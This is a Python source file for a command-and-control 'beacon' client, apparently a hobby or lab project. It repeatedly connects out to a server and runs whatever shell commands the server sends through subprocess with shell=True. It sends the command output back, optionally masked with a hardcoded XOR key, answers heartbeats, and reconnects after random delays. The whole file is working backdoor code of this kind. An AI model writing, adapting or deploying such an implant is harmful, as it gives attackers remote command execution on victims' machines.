#!/usr/bin/python3

import socket,subprocess,time,random,platform,psutil
from Crypto.Util.strxor import strxor

class Beacon:
   #Contains client side behavior and state

   __slots__ = ["sock","running","server_ip","server_port","debugging","key","encryption","local_ip"]

   def __init__(self,server_ip,server_port):
      self.running = False
      self.server_ip = server_ip
      self.server_port = server_port
      self.debugging = True
      self.key = "chandifortnite"
      self.local_ip = self.detect_local_ip()

   def connect(self):
      try:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.connect((self.server_ip,self.server_port))
         message = self.sock.recv(15).decode()
         if message == "encryption on":
            self.encryption = True
         elif message == "encryption off":
            self.encryption == False
         else:
            raise RuntimeError("Unexpected Network Message Received")
         if self.encryption == True:
            self.sock.send(self.encrypt(self.local_ip.encode()))
         else:
            self.sock.send(self.local_ip.encode())
      except:
         self.sock.close()

   def run_command(self,command):
      try:
         cmd = command.split(" ")
         ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
         if self.debugging == True:
            print("Sending:" ,ps.stdout)
         if ps.stdout != None and ps.stdout != b'':
            if len(ps.stdout) > 65535:
               for i in range(0, len(ps.stdout), 65535):
                 chunk = ps.stdout[i:i+65535]
                 if self.encryption == True:
                  self.sock.send(self.encrypt(chunk))
                  self.sock.send(self.encrypt("END".encode()))
                 else:
                  self.sock.send(chunk)
                  self.sock.send("END".encode())
            else:
               if self.encryption == True:
                 self.sock.send(self.encrypt(ps.stdout))
                 self.sock.send(self.encrypt("END".encode()))
               else:
                 self.sock.send(ps.stdout)
                 self.sock.send("END".encode())
         else:
            if self.encryption == True:
               self.sock.send(self.encrypt("SUCCESS".encode()))
               self.sock.send(self.encrypt("END".encode()))
            else:
               self.sock.send("SUCCESS".encode())
               self.sock.send("END".encode())
      except Exception as e:
                     error_msg = f"ERROR: {str(e)}"
                     if self.debugging == True:
                        print(error_msg)
                     if self.encryption == True:
                        self.sock.send(self.encrypt(error_msg.encode()))
                     else:
                        self.sock.send(error_msg.encode())

   def start(self):
      self.running = True
      while self.running:
            self.connect()
            if self.sock:
                self.run()
            else:
                time.sleep(10)
   
   def run(self):
      try:
         while self.running:
               self.sock.settimeout(5)
               try:
                  if self.encryption == True:
                     data = self.decrypt(self.sock.recv(4096)).decode()
                     if not data:
                        # If no data is received, break the loop
                        break
                     if self.debugging == True:
                        print("Received:",data)
                     split = data.split("|")
                     if split[0] == "cmd":
                        self.run_command(split[1])
                     elif split[0] == "quit":
                        self.terminate()
                     elif split[0] == "heartbeat":
                        self.sock.send(self.encrypt("ACTIVE".encode()))
                     else:
                        self.sock.send(self.encrypt("Unknown Error".encode()))
                  else:
                     data = self.sock.recv(4096).decode()
                     if not data:
                        # If no data is received, break the loop
                        break
                     if self.debugging == True:
                        print("Received:",data)
                     split = data.split("|")
                     if split[0] == "cmd":
                        self.run_command(split[1])
                     elif split[0] == "quit":
                        self.terminate()
                     elif split[0] == "heartbeat":
                        self.sock.send("ACTIVE".encode())
                     else:
                        self.sock.send("Unknown Error".encode())
               except socket.timeout:
                  continue
      except:
         try:
            time.sleep(random.randint(120,300))
            self.start()
         except RecursionError:
            quit()
            
   def terminate(self):
      self.running = False
      if self.sock:
         self.sock.close()
   
   def encrypt(self,data):
      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
      return strxor(data,key.encode())

   def decrypt(self,data):
      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
      return strxor(data,key.encode())
   
   def detect_local_ip(self):
      if platform.system() == "Windows":
         local_ip = socket.gethostbyname(socket.gethostname())
         return local_ip
      elif platform.system() == "Linux":
         local_ip = subprocess.run("hostname -I",shell=True,capture_output=True,text=True).stdout.strip()
         return local_ip
      else:
         return "Unsupported OS"

def main():
   beacon = Beacon("127.0.0.1",10267)
   beacon.start()

if __name__ == "__main__":
   main()
